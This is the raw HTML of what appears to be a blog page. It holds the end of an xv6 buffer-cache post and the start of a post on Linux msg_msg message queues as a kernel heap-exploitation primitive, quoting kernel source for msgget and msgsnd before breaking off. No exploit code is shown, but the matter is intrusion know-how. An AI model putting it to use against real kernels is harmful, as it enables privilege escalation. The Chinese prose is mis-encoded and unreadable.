acquire(&amp;tickslock);</span><br><span class="line">  b-&gt;timetick = ticks;</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt++;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bunpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ &msgåˆ©ç”¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-10-17 01:52:12 / ä¿®æ”¹æ—¶é—´ï¼š01:52:35" itemprop="dateCreated datePublished" datetime="2022-10-17T01:52:12+08:00">2022-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ -amp-msgåˆ©ç”¨"><a href="#æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ -amp-msgåˆ©ç”¨" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ &amp;msgåˆ©ç”¨"></a>æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ &amp;msgåˆ©ç”¨</h1><p>ä¹‹å‰è°¢å“¥å‘äº†æˆ‘ä¸¤é“kernelpwnçš„é¢˜ç›®ï¼Œéƒ½æ˜¯æ¯”è¾ƒç®€å•çš„å †æ¼æ´ï¼Œä½†æ˜¯å †çš„sizeä¸å†æ˜¯å¾ˆå¥½åˆ©ç”¨çš„0x20æˆ–è€…0x2e0äº†ï¼Œç„¶åæœäº†æœkernelpwné€šç”¨ç»“æ„ä½“å‘ç°è¿˜æ˜¯æ²¡æœ‰å½“å‰sizeä¸‹å¯ä»¥åˆ©ç”¨çš„å†…æ ¸ç»“æ„ï¼Œç»è¿‡è°¢å“¥æé†’<code>msg</code>å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯çœ‹äº†ä¼š<code>msg</code>å‘ç°è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„,ç„¶åå°±æ‘†äº†ï¼Œä¸€æ‘†å°±æ‘†åˆ°äº†ç°åœ¨hhï¼Œç—›å®šæ€ç—›ï¼Œå¼€å§‹å­¦ä¹ ã€‚</p>
<h2 id="msgå­¦ä¹ "><a href="#msgå­¦ä¹ " class="headerlink" title="msgå­¦ä¹ "></a>msgå­¦ä¹ </h2><h3 id="åŸºç¡€ä»‹ç»"><a href="#åŸºç¡€ä»‹ç»" class="headerlink" title="åŸºç¡€ä»‹ç»"></a>åŸºç¡€ä»‹ç»</h3><p>æ¶ˆæ¯é˜Ÿåˆ—msgå’Œå…±äº«å†…å­˜ä¸€æ ·æ˜¯linuxæä¾›çš„ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æ–¹å¼(IPC),ä¸€èˆ¬ç§°ä»–ä¸ºIPCå¯¹è±¡ï¼Œåœ¨Linuxä¸­ä½¿ç”¨keyæ¥å”¯ä¸€æ ‡è¯†ï¼Œè€Œä¸”ä»–ä»¬æ˜¯å¯æŒç»­åŒ–ï¼Œå½“è¿›ç¨‹åˆ›å»ºäº†ä¸€ä¸ªIPCå¯¹è±¡ä¹‹åï¼Œè¿™ä¸ªå¯¹è±¡ä¸ä¼šå› ä¸ºè¿›ç¨‹çš„é€€å‡ºè€Œé”€æ¯ï¼Œè€Œæ˜¯ä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°è°ƒç”¨IPCåˆ é™¤å‡½æ•°æ¥åˆ é™¤ã€‚</p>
<p>æ¶ˆæ¯é˜Ÿåˆ—çš„IPCå¯¹è±¡ï¼Œkeyå’Œidä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾ï¼Œå…¶ä¸­keyæ˜¯å”¯ä¸€çš„ï¼Œå”¯ä¸€ç¡®å®šä¸€ä¸ªIPCå¯¹è±¡ï¼Œä½†æ˜¯æ¯ä¸ªè¿›ç¨‹çš„idæ˜¯å¯ä»¥å˜åŒ–çš„ï¼Œidå°±ç›¸å½“äºæ–‡ä»¶æè¿°ç¬¦ï¼Œkeyå°±ç›¸å½“äºæ–‡ä»¶åï¼ŒIPCå¯¹è±¡ç›¸å½“äºæ–‡ä»¶å†…å®¹ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210407233522324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQzODc5Nw==,size_16,color_FFFFFF,t_70" alt="ç³»ç»ŸIPCå¯¹è±¡"></p>
<h3 id="å¸¸ç”¨å‡½æ•°ä»‹ç»"><a href="#å¸¸ç”¨å‡½æ•°ä»‹ç»" class="headerlink" title="å¸¸ç”¨å‡½æ•°ä»‹ç»"></a>å¸¸ç”¨å‡½æ•°ä»‹ç»</h3><h4 id="ftok"><a href="#ftok" class="headerlink" title="ftok()"></a>ftok()</h4><p>äº§ç”Ÿé”®å€¼<code>key_t ftok(const char *pathname, int proj_id);</code></p>
<h4 id="msgget"><a href="#msgget" class="headerlink" title="msgget()"></a>msgget()</h4><p>å¾—åˆ°ipcå¯¹è±¡çš„idå€¼æˆ–è€…åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå½“ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ftokåˆ›å»ºçš„keyæˆ–è€…<code>IPC_PRIVATE</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æ§åˆ¶åˆ›å»ºæ¶ˆæ¯é˜Ÿåˆ—çš„æ“ä½œå’Œè¯»å†™æƒé™ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>å½“è°ƒç”¨äº†msgget()å‡½æ•°çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šè°ƒç”¨<code>ksys_msgget()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	msg_params.key = key;</span><br><span class="line">	msg_params.flg = msgflg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè°ƒç”¨<code>ipcget</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE)</span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“key=<code>IPC_PRIVATE</code>çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨<code>ipcget_new()</code>åˆ›å»ºä¸€ä¸ªæ–°çš„æ¶ˆæ¯é˜Ÿåˆ—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	err = ops-&gt;getnew(ns, params);</span><br><span class="line">	up_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>ops-&gt;getnew()</code>,åœ¨<code> ksys_msgget</code>å‡½æ•°ä¸­ï¼Œè¿™ä¸ªå‡½æ•°æŒ‡é’ˆè¢«èµ‹å€¼æˆ<code>newque</code>,ä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨<code>newque</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯åˆå§‹åŒ–ç»“æ„ä½“<code>msg_queue</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="msgsnd"><a href="#msgsnd" class="headerlink" title="msgsnd()"></a>msgsnd()</h4><p><code>msgsnd</code>å‡½æ•°ä¼šå‘æŒ‡å®šidå¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span>  msqid , <span class="keyword">const</span> <span class="keyword">void</span> * msgp , <span class="keyword">size_t</span>  msgsz , <span class="keyword">int</span>  msgflg )</span></span>;</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span><span class="comment">//ä¸»æ¶ˆæ¯æ®µå¤´éƒ¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span> <span class="comment">//æ¶ˆæ¯åŒå‘é“¾è¡¨æŒ‡é’ˆ</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* æ¶ˆæ¯å¤§å° */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//æŒ‡å‘æ¶ˆæ¯ç¬¬äºŒæ®µ</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* åé¢æ¥ç€æ¶ˆæ¯çš„æ–‡æœ¬ */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span><span class="comment">//å­æ¶ˆæ¯æ®µå¤´éƒ¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//æŒ‡å‘ä¸‹ä¸€æ®µçš„æŒ‡é’ˆï¼Œæœ€å¤šä¸‰æ®µ</span></span><br><span class="line">	<span class="comment">/* åé¢æ¥ç€æ¶ˆæ¯ç¬¬äºŒ/ä¸‰æ®µçš„æ–‡æœ¬ */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸å’Œæ‰§è¡Œ<code>ksys_msgsnd()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°è°ƒç”¨<code>do_msgsnd()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype;</span><br><span class="line">	msg-&gt;m_ts = msgsz;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		